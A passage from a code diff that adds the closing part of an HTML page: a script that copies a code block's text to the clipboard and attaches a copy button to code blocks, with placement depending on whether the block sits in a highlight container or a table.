+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
